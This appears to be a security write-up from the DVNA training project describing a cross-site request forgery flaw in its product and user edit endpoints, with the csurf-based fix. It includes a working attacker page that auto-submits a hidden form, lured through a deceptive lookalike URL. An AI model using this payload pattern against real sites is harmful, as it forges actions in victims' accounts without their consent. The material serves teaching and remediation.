# Cross-site Request Forgery

## CSRF in Add/Edit product, User Edit

The application is vulnerable to a Cross-sites-Request-Forgery in `Product Management` feature. The application fails to implement anti-CSRF token to prevent forced browsing.

http://127.0.0.1:9090/app/modifyproduct

http://127.0.0.1:9090/app/useredit

This issue can be exploited by an attacker by hosting a malicious page like the one below and tricking the victim onto visiting it. The below example will add a new product on behalf of the victim on visiting a crafted URL like `http://youtube.com.xyz.nxd/watch/v=cute-kitten` by the attacker

*Attacker's Webpage*
```html
<html>
    <body onload='document.hidden_form.submit()'>
        <form name="hidden_form" method="POST" action="http://127.0.0.1:9090/app/modifyproduct">
            <input type="hidden" name="name" value="Hacked">
            <input type="hidden" name="code" value="hacked">
            <input type="hidden" name="tags" value="hack">
            <input type="hidden" name="description" value="This is a hacked product">
        </form>
    </body>
</html>
```

**Solution**

CSRF vulnerabilities can be fixed by ensuring anti-CSRF tokens are needed for successful form submission. 

This can be done by using a module like [csurf](https://www.npmjs.com/package/csurf), and can save time needed to correctly implement your own logic.

**Fixes**

Implemented in the following files

- *routes/app.js*
- *core/appHandler.js*
- *views/app/modifyproducts.ejs*
- *views/app/useredit.ejs*

The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/2c88ab87f19a9d124c925d33f346ec3897038eea)

**Reference**

- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
- https://github.com/expressjs/csurf